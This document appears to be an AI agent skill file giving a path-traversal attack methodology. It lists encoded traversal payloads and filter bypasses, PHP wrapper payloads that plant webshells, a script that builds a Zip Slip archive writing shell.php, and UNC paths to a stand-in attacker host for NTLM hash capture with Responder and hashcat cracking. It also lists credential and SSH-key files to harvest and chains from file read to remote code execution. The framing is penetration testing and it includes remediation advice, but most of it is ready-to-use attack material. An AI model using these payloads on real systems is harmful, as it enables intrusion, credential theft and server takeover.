---
name: path-traversal
description: Directory traversal - filter bypass encodings, PHP wrapper abuse for source disclosure, archive extraction (Zip Slip), and arbitrary file read to RCE chains
---

## When to use this skill

Use this skill whenever an application accepts a file path, file name, or path-like fragment from user input and uses it to touch the filesystem. Path traversal (CWE-22, OWASP A01:2021 Broken Access Control) is one of the highest-yield findings in web assessments because a single vulnerable parameter frequently escalates to arbitrary file read, source code disclosure, credential theft, and — when combined with `include()`/`require()` or log poisoning — full remote code execution.

Trigger this skill when you observe any of the following:

- **File-path parameters in URLs**: `?file=`, `?page=`, `?path=`, `?doc=`, `?download=`, `?view=`, `?read=`, `?show=`, `?lang=`, `?template=`, `?include=`, `?module=`, `?action=`, `?theme=`, `?conf=`.
- **POST bodies** carrying file references: form fields like `filename`, `filepath`, `attachment`, `report`, `import_file`, or JSON keys such as `"file": "report.pdf"`, `"template": "invoice.html"`.
- **Cookies** storing UI state as a path: `language=en`, `theme=dark.css`, `template=default`, `locale=../../conf`, `saved_view=reports.txt`.
- **HTTP headers** consumed by the backend: `X-Forwarded-For` written to logs (log-poisoning pivot), custom headers like `X-File-Name`, `X-Template`, `X-Asset-Path`, or `Referer`/`User-Agent` used to select include files.
- **File download endpoints**: `/download?name=`, `/api/v1/files/<name>`, `/export?format=pdf&file=`, `/static/<user-controlled-segment>`.
- **Archive upload features**: any endpoint accepting ZIP/TAR/JAR/GZ and extracting server-side — prime Zip Slip territory even without a path parameter.
- **Localization or templating systems**: `?lang=fr` mapping to `includes/fr.php`, `?page=about` mapping to `pages/about.php` — classic LFI-to-RCE via wrappers.
- **Java/.NET/Node backends** where a parameter reaches `new File()`, `Files.readAllBytes()`, `Path.resolve()`, `fs.readFile()`, `File.ReadAllText()`, or `send_file()`.

Scope notes: test every entry point (GET, POST, cookie, header, URL path segment, multipart filename), not just the obvious download link. Path traversal is frequently present in "boring" endpoints — report exporters, log viewers, invoice PDF generators, image resizers — that developers assume are safe because they are not linked in the UI.

## Methodology

### 1. Identify and baseline file-path parameters

Map every parameter that plausibly touches the filesystem. For each candidate, establish a baseline response so you can distinguish "file not found" from "filter blocked" from "file read successfully":

```http
GET /download?file=report.pdf HTTP/1.1
Host: target.example.com
```

Baseline probes for each candidate parameter: request the exact legitimate value (`report.pdf`) and record status, body length, Content-Type; request a nonexistent value (`report.pdfXXX`) and record the error signature; request a value with a single `../` (`../report.pdf`) — if the response differs from the nonexistent-file baseline, the input reaches a filesystem call; repeat the same probes via POST body, cookie, and headers if the parameter exists in those positions.

Baseline files that exist on nearly every host and produce a distinctive, verifiable body:

```text
/etc/passwd
/etc/hostname
/proc/version
C:\Windows\win.ini
C:\Windows\system.ini
```

If the application prepends a directory or appends an extension (e.g. `include($_GET['page'] . '.php')`), note the suffix behavior: you may need a null byte (legacy PHP), a `?` fragment (some wrappers), or traversal ending in a file with the expected extension.

### 2. Traversal sequence ladder

Work from simplest to most exotic — each rung defeats a different filter class. Replace `TARGET_FILE` with `/etc/passwd` (Linux) or `..\..\..\windows\win.ini` (Windows).

**Rung 1 — plain traversal, both separators:**

```text
../../../../etc/passwd
..\..\..\..\windows\win.ini
```

**Rung 2 — URL-encoded separators (defeats filters that decode once and block literal `../`):**

```text
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
```

**Rung 3 — double URL-encoding (defeats single-decode filters and WAFs that normalize before the app decodes again):**

```text
..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%255c..%255cwindows%255cwin.ini
```

**Rung 4 — overlong UTF-8 / unicode encodings (naive byte-level filters, older Java servlet containers, some IIS configs):**

```text
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%af%c0%af%c0%afetc%c0%afpasswd
%e0%40%85%e0%40%8e/etc/passwd
%25c0%25ae%25c0%25ae/etc/passwd
```

**Rung 5 — mixed separators and dot tricks (defeats filters matching exact `../` or `..\` strings):**

```text
..\/..\/..\/etc/passwd
..//////..////..////etc/passwd
....//....//....//etc/passwd
..././..././..././etc/passwd
..%5c..%5c..%5c%2e%2e%2fetc%2fpasswd
```

**Rung 6 — 16-bit Unicode (some Java/Tomcat and IIS normalization paths):**

```text
%u2215%u2215%u2215etc%u2215passwd
..%u2216..%u2216etc%u2216passwd
```

Depth guidance: when the number of directories is unknown, over-traverse — `../../../../../../../../../etc/passwd` with 15+ repetitions is harmless on Linux (extra `..` at `/` are no-ops) and guarantees you clear the web root. On Windows, over-traverse then anchor with an absolute path as a fallback.

### 3. Filter bypass patterns

**Stripped-prefix self-correcting sequences.** When the filter strips all occurrences of `../` non-recursively (e.g. `str_replace('../', '', $input)` in PHP or a single `replace()` in Java), the classic bypass re-forms `../` after stripping:

```text
....//....//....//etc/passwd
..././..././..././etc/passwd
..../....//..../....//etc/passwd
```

After one pass of `../` removal, `....//` becomes `../`. If the filter loops until clean, use `..././`, which survives one pass but not repeated passes — test both.

**Absolute path injection.** Many implementations only block dots or relative traversal but pass the value straight into a filesystem call; if dots are filtered, absolute paths bypass everything:

```text
/etc/passwd
/etc/shadow
C:\Windows\win.ini
C:/Windows/win.ini
\\attacker\share\file.txt
file:///etc/passwd
```

**Null byte (legacy PHP < 5.3.4, old Perl/Java file APIs).** When the app appends a forced extension (`.php`, `.html`, `.png`), terminate the path with a null byte so the extension is discarded by the underlying C library:

```text
../../../../etc/passwd%00
../../../../etc/passwd%00.html
..%252fetc%252fpasswd%2500
```

Also try `%00` with the extension intact (`passwd%00.php`) and double-encoded forms (`%2500`). This is dead on modern PHP but still live on legacy stacks, embedded devices, and old Java `File` handling.

**Truncation and normalization tricks.** On filesystems with path-length limits (older Windows ~260 chars), pad with dots so the trailing extension falls off the effective path; also probe normalization gaps:

```text
../../../../etc/passwd....................
./../../etc/passwd
/etc/./passwd
/etc//passwd
/etc/passwd/.
```

**Case and wildcard tricks (Windows).** Windows paths are case-insensitive and accept 8.3 short names:

```text
C:\Windows\WIN~1.INI
C:\PROGRA~1\..\..\windows\win.ini
c:\windows\win.ini
```

### 4. PHP wrapper abuse (LFI → source disclosure → RCE)

**php://filter for source disclosure.** When a parameter reaches `include()`, `require()`, `file_get_contents()`, `readfile()`, or `fopen()`, the `php://filter` wrapper converts source files to base64 — bypassing the "PHP files are executed, not displayed" behavior:

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=../config/database.php
```

Decode the response body with `base64 -d` to recover the raw source. This is the single most reliable way to read application source through an LFI.

**Nested filter chains.** Filters can be chained to generate arbitrary content (the well-known "php_filter_chain_generator" technique) — useful when the wrapper output is passed to `include()` and you need to inject PHP code without an upload point:

```text
php://filter/convert.base64-decode|convert.base64-decode|convert.iconv.utf-8.utf-16le|convert.base64-decode/resource=data://text/plain,PD9waHAgcGhwaW5mbygpOyA/Pg==
```

Practical workflow: use the public `php_filter_chain_generator.py` script to produce a chain decoding to `<?php system($_GET["cmd"]); ?>`, then supply it as the include target. The generator brute-forces iconv conversions whose intermediate byte sequences happen to spell the base64 alphabet characters you need, so the final filter output is exactly your payload.

**data:// wrapper for RCE.** If `allow_url_include=On` (rare but present on misconfigured hosts) and the parameter reaches `include()`/`require()`, execute code directly:

```text
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
data://text/plain,<?php system($_GET["c"]); ?>
```

(The base64 above decodes to `<?php system($_GET['c']); ?>`.)

**expect:// wrapper.** If the `expect` PECL extension is loaded, `expect://` executes a shell command directly when the path is opened:

```text
expect://id
expect://ls%20-la%20/var/www
```

**Other wrappers worth testing:**

```text
phar://archive.phar/inner.php          (phar deserialization trigger)
zip:///var/www/html/uploads/shell.zip/shell.php
file:///etc/passwd
http://attacker.example/shell.txt      (if allow_url_include=On)
glob:///etc/*.conf
```

**phar:// deserialization note.** If the target runs PHP with `phar` support and any file function (`file_exists`, `is_file`, `file_get_contents`) receives your path, uploading a polyglot image containing a crafted phar metadata block and requesting `phar://uploads/evil.jpg/` triggers PHP object injection — a full RCE chain even without `allow_url_include`.

### 5. Java and .NET specifics

**Java.** `java.io.File`, `java.nio.file.Paths`, and `URL`-based readers accept scheme-based URLs:

```text
file:///etc/passwd
file:/etc/passwd
netdoc:/etc/passwd
jar:file:///var/lib/app/app.jar!/META-INF/MANIFEST.MF
```

`netdoc://` is a rarely-known protocol handler accepted by `new URL(...)` in the JDK — it behaves like `file://` and is frequently missed by filters that whitelist `http`/`https` only. Java normalizes `..` sequences in `File`/`Path` before the OS call, so plain traversal usually works unless the code explicitly calls `normalize()` and re-validates. Tomcat historically blocked `..%2f` but not `..%5c` on Windows — test both.

**.NET.** `System.IO.File.ReadAllText()`, `StreamReader`, and `Path.Combine()` are the usual sinks. Key behaviors: `Path.Combine("C:\\app\\uploads", "..\\..\\windows\\win.ini")` resolves to `C:\windows\win.ini` because traversal in the second argument wins; .NET does not URL-decode automatically in all handlers, so test both raw and encoded forms; the extended-length prefix `\\?\C:\Windows\win.ini` bypasses some path-length and normalization checks; UNC paths (`\\attacker\share\x.txt`) trigger outbound SMB authentication (see section 7); ASP.NET request validation may block `<` and `%` in some fields, so use POST bodies or cookies to bypass input validation that only applies to query strings.

**Node.js.** `fs.readFile()` with `path.join(base, input)` is vulnerable when `input` is absolute (`/etc/passwd` overrides the join base), and `path.normalize()` does not protect against absolute-path injection. Also test `file://` via `fetch()`/`axios` if the URL is user-controlled.

### 6. Zip Slip (archive extraction traversal)

When an application extracts user-supplied archives, entry names containing `../` can write files outside the extraction directory. This is a write primitive — far more powerful than read-only traversal.

**Vulnerable Python pattern** (naive `zipfile` usage without name validation):

```python
import zipfile

def extract_archive(zip_path, dest_dir):
    with zipfile.ZipFile(zip_path) as zf:
        for entry in zf.namelist():
            zf.extract(entry, dest_dir)   # VULNERABLE: no containment check
```

**Vulnerable Java pattern** (the canonical Zip Slip code from the original Snyk research):

```java
Enumeration<ZipEntry> entries = zipFile.getEntries();
while (entries.hasMoreElements()) {
    ZipEntry e = entries.nextElement();
    File f = new File(destDir, e.getName());   // VULNERABLE: e.getName() may contain ../
    InputStream is = zipFile.getInputStream(e);
    IOUtils.copy(is, new FileOutputStream(f));
}
```

**Vulnerable Go pattern** (missing `filepath.Clean` + prefix check):

```go
for _, f := range r.File {
    fpath := filepath.Join(destDir, f.Name)   // VULNERABLE if f.Name = ../../evil.sh
    out, _ := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
    rc, _ := f.Open()
    io.Copy(out, rc)
}
```

**Crafting a malicious archive:**

```bash
python3 - <<'EOF'
import zipfile, tarfile, io
with zipfile.ZipFile("evil.zip", "w") as z:
    z.writestr("../../../../tmp/pwned.txt", "zip-slip proof")
    z.writestr("../../../../var/www/html/shell.php", "<?php system($_GET['c']); ?>")
    z.writestr("..\\..\\..\\Windows\\Temp\\pwned.txt", "windows zip slip")
data = b"tar-slip proof"
ti = tarfile.TarInfo("/tmp/pwned.txt"); ti.size = len(data)
with tarfile.open("evil.tar", "w") as t:
    t.addfile(ti, io.BytesIO(data))
EOF
```

Upload the archive to the extraction endpoint, then verify landing by requesting the written file or observing behavior (e.g. a webshell at the escaped path). Also test symlink entries: an archive containing a symlink pointing to `/` followed by a file entry under that symlink name escapes the directory on extractors that honor symlinks.

### 7. Windows-specific techniques

**Backslash separators and drive letters:**

```text
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini
C:\Windows\win.ini
C:/Windows/win.ini
C:\inetpub\wwwroot\web.config
```

**UNC paths for NTLM credential leak.** If the target is Windows and can make outbound SMB connections, a UNC path in the traversal parameter causes the host to authenticate to your machine, leaking the NTLMv2 hash of the service account:

```text
\\attacker.example\share\probe.txt
\\attacker.example\share
//attacker.example/share/probe.txt
file://attacker.example/share/probe.txt
```

Capture and crack the hash:

```bash
sudo responder -I eth0                                    # capture NTLMv2 challenge/response
sudo python3 -m impacket.smbserver share /tmp/share -smb2support   # alternative listener
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt      # crack mode 5600
```

**Other Windows quirks:** trailing dots and spaces are stripped by Win32 (`C:\Windows\win.ini.` resolves); 8.3 short names hide from directory listings (`C:\PROGRA~1`, `C:\DOCUME~1`); Alternate Data Streams such as `C:\inetpub\wwwroot\web.config::$DATA` may bypass filters matching the extension; IIS short-name enumeration combined with traversal can reveal files even when directory listing is disabled.

### 8. High-value target files per stack

**Linux — always try first:**

```text
/etc/passwd                          # user list, home dirs, shell paths
/etc/shadow                          # password hashes (readable only if root or misconfigured perms)
/etc/hosts
/etc/crontab + /etc/cron.d/*         # scheduled jobs → privilege escalation paths
/proc/self/environ                   # env vars of the web process (DB creds, secrets)
/proc/self/cmdline                   # exact command line of the web process
/proc/self/fd/0..20                  # open FDs — often the config file itself
/proc/net/tcp                        # listening ports → internal service discovery
/etc/nginx/nginx.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/php/*/fpm/pool.d/www.conf       # PHP-FPM pool: env vars, socket, user
/etc/mysql/debian.cnf                # DB creds in cleartext on Debian
/root/.ssh/id_rsa                    # private key → SSH as root if authorized_keys permits
/home/*/.ssh/id_rsa
/home/*/.bash_history
/var/log/auth.log                    # log poisoning target for LFI→RCE
/var/log/apache2/access.log
/var/log/mail.log                    # log poisoning via SMTP HELO/MAIL FROM
/run/secrets/                        # Docker/Kubernetes mounted secrets
```

**Docker socket hints.** If `/proc/self/mounts` shows `docker.sock` mounted, or `/proc/self/cgroup` reveals a container ID and `/.dockerenv` exists, the app is containerized. A readable `/var/run/docker.sock` is game over: chain to Docker API requests (`curl --unix-socket /var/run/docker.sock http://localhost/images/json`) to spawn a privileged container mounting the host filesystem.

**Windows:**

```text
C:\Windows\win.ini
C:\Windows\repair\SAM                # legacy password hashes
C:\inetpub\wwwroot\web.config        # ASP.NET machine keys, connection strings
C:\Program Files\MySQL\my.ini
C:\Users\<user>\.ssh\id_rsa
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\Windows\Panther\unattend.xml      # unattended install creds
```

**Stack-specific application config paths:**

```text
/var/www/html/.env                   # Laravel/Symfony — APP_KEY, DB_PASSWORD, AWS keys
/var/www/html/wp-config.php          # WordPress — DB creds, salts
/var/www/html/sites/default/settings.php  # Drupal
/app/config/settings.py              # Django — SECRET_KEY, DB creds
/WEB-INF/web.xml                     # Java — servlet config, datasource names
/WEB-INF/classes/application.properties    # Spring Boot
/META-INF/context.xml                # Tomcat — DB credentials
```

Reading `/proc/self/environ` is often the fastest credential harvest — the web process environment typically contains `DB_PASSWORD`, `SECRET_KEY`, `AWS_ACCESS_KEY_ID`, and API tokens. Variables are separated by null bytes, so the response may render as one blob; split on `\x00`.

### 9. Wordlists and fuzzing

Use curated traversal wordlists rather than hand-crafting every payload:

```bash
ls /usr/share/seclists/Fuzzing/
# Key files:
#   /usr/share/seclists/Fuzzing/traversal.fuzz.txt   (hundreds of pre-built sequences)
#   /usr/share/seclists/Fuzzing/LFI-LFISuite-potvar.txt
#   /usr/share/seclists/Fuzzing/dotdotpwn.txt        (dotdotpal-style list)
```

Generate depth-specific lists on the fly when the base directory depth is known:

```bash
python3 -c "
for i in range(1, 11):
    print('../' * i + 'etc/passwd')
    print('%2e%2e%2f' * i + 'etc%2fpasswd')
" > depth_list.txt
```

**ffuf loop example** — fuzz a parameter with the traversal wordlist and match on a known-content signature:

```bash
ffuf -u "https://target.example.com/download?file=FUZZ" \
     -w /usr/share/seclists/Fuzzing/traversal.fuzz.txt \
     -fc 403,404 -mr "root:x:0:0" -c -v -o ffuf_traversal.json

# Fuzz the URL path position instead of a query parameter
ffuf -u "https://target.example.com/static/FUZZ" \
     -w /usr/share/seclists/Fuzzing/traversal.fuzz.txt -mr "root:" -c

# Fuzz cookies (traversal via cookie value)
ffuf -u "https://target.example.com/dashboard" \
     -H "Cookie: template=FUZZ" \
     -w /usr/share/seclists/Fuzzing/traversal.fuzz.txt -mr "root:" -c
```

Key ffuf flags for traversal work: `-mr` (match regex on response body — the strongest signal), `-fs`/`-fc` (filter baseline noise), `-replay-proxy` (send hits to Burp for manual confirmation), `-ac` (auto-calibrate against random responses).

### 10. Tooling

**ffuf / Burp Intruder with recursive payload positions.** For parameters where the app prepends a directory, use Intruder's recursive grep or ffuf's request-file mode for full control over POST bodies, cookies, and headers:

```bash
cat > traversal_req.txt <<'EOF'
POST /api/v1/export HTTP/1.1
Host: target.example.com
Content-Type: application/json
Cookie: session=SESSIONVALUE

{"file": "FUZZ"}
EOF

ffuf -request traversal_req.txt \
     -w /usr/share/seclists/Fuzzing/traversal.fuzz.txt \
     -mr "root:" -c -o ffuf_post.json
```

Burp Intruder setup: payload position `?file=§FUZZ§`, payload type "Simple list" of traversal payloads, Grep-Match string `root:x:0:0` to flag successful reads, and request throttling of 1–2 rps to avoid tripping rate limits.

**dotdotpwn** — purpose-built traversal fuzzer with module support:

```bash
# HTTP module against a GET parameter
dotdotpwn.pl -m http -h target.example.com -x 80 \
  -f /etc/passwd -d 5 -b -k "root:" \
  -u "http://target.example.com/download?file=TRAVERSAL"

# FTP module (traversal in FTP commands)
dotdotpwn.pl -m ftp -h target.example.com -u anonymous -p anonymous \
  -f /etc/passwd -d 5 -b

# TFTP module
dotdotpwn.pl -m tftp -h target.example.com -f /etc/passwd -b
```

Flags: `-d` depth, `-b` break on first hit, `-k` keyword to match in response, `-s` continue scanning after a hit.

**Supporting tools:**

```bash
# LFISuite — automated LFI scanner with shell interaction
git clone https://github.com/D35m0nd142/LFISuite.git && cd LFISuite && python lfi.py

# fimap — classic LFI discovery and exploitation
fimap -u "https://target.example.com/page?file=index"

# Manual curl loop for quick depth testing
for i in $(seq 1 12); do
  path=$(python3 -c "print('../' * $i + 'etc/passwd')")
  echo "=== depth $i ==="
  curl -s "https://target.example.com/download?file=$path" | head -3
done
```

## Verification & Deliverables

### Proving arbitrary file read

A traversal finding is only reportable as "arbitrary file read" once you demonstrate reading a file whose contents you can verify independently. Gold-standard proof files: `/etc/passwd` (contains the predictable line `root:x:0:0:root:/root:/bin/bash`), `/etc/hostname` (cross-check against server banners), `/proc/version` (exact kernel string verifiable against stack fingerprint), and on Windows `C:\Windows\win.ini` (contains `[fonts]` and `[extensions]` section headers).

Verification workflow:

1. Read `/etc/passwd` and confirm the `root:` line appears — this proves the read crossed the web root and reached the OS filesystem.
2. Read `/etc/hostname` and cross-check against any server banner, error page, or `Server` header.
3. Read `/proc/self/environ` and confirm at least one variable matching the application's known configuration (e.g. `PWD=/var/www/html`).
4. Capture the raw HTTP request/response pair for each proof — this is your evidence artifact.

### Source disclosure → credential capture → next-step pivot

The highest-value chain is reading application source to extract credentials, then pivoting:

1. **Disclose source** via `php://filter/convert.base64-encode/resource=index.php` (or `file:///` on Java); decode and save the source tree.
2. **Extract DB credentials** from the disclosed config:

```text
php://filter/convert.base64-encode/resource=../config/database.php
php://filter/convert.base64-encode/resource=.env
file:///var/www/html/.env
```

3. **Test the credentials** against the disclosed DB host (often an internal IP revealed in `/etc/hosts` or `/proc/net/tcp`):

```bash
mysql -h <internal-db-host> -u <user> -p<password> -e "SELECT version();"
```

4. **Pivot to RCE** using one of these chains, in order of reliability:
   - `data://` or `expect://` wrapper if `include()` accepts the parameter (test immediately).
   - Log poisoning: inject PHP into `access.log` via a malformed `User-Agent`, then include the log path through the traversal parameter.
   - Session poisoning: inject PHP into `$_SESSION` values stored in `/var/lib/php/sessions/sess_<cookie>`, then include the session file.
   - Upload + traversal: upload a polyglot image (valid JPEG header + PHP payload), then use traversal to include it from its stored path, bypassing extension checks on the include side.
   - Zip Slip write: upload a crafted archive that writes a webshell into the web root (see section 6).
   - SSH key theft: read `/root/.ssh/id_rsa` or `/home/*/.ssh/id_rsa`, save it, `chmod 600`, then attempt `ssh -i key user@target`.

5. **Document the chain** end-to-end: initial parameter → bypass technique → proof file → credential extraction → pivot action → impact statement.

### Deliverables checklist

- **Vulnerable parameter inventory**: every entry point (URL, parameter name, HTTP method, cookie/header) confirmed to reach a filesystem call, with baseline-vs-anomaly evidence.
- **Working bypass payload**: the exact traversal sequence or wrapper string that succeeded, including the filter it defeated (e.g. "double URL-encoding defeated single-decode WAF rule").
- **Proof-of-concept requests**: raw HTTP request/response pairs (curl commands or Burp suite items) demonstrating arbitrary read of `/etc/passwd` and at least one OS-verified file.
- **Source disclosure evidence**: base64-decoded application source files obtained via `php://filter` or `file://`, with the config file containing credentials highlighted.
- **Credential findings**: DB credentials, API keys, `.env` secrets, or SSH keys recovered, with the file path they came from and a note on whether they were validated against a live service.
- **RCE chain documentation** (if achieved): the full chain from traversal to command execution, with a benign proof command (`id`, `uname -a`, `whoami`) and its output — never destructive commands.
- **Zip Slip evidence** (if applicable): the crafted archive, the vulnerable extraction code identified, and proof of the file landing outside the extraction directory.
- **NTLM hash capture** (if applicable): the Responder/impacket capture showing the leaked hash and the account it belongs to.
- **Remediation guidance**: normalize and validate paths with an allowlist of permitted basenames; reject absolute paths and any `..` sequence after decoding; use `Path.normalize()` plus prefix containment checks (Java/Go) and `realpath()` plus a base-prefix assertion (PHP); avoid passing user input to `include()`/`require()` entirely; and extract archives with entry-name validation against the destination directory before writing.
- **Risk rating**: map the finding to CWE-22 / CWE-23 / CWE-36 and OWASP A01:2021, with impact justified by the demonstrated chain (e.g. "arbitrary file read → source disclosure → DB credential theft → internal database access").

Every deliverable should be reproducible by a third party following your captured requests verbatim, and every claim of impact should trace back to a concrete, captured artifact — that is the standard that turns a traversal finding from a theoretical bug into an accepted, high-severity report.
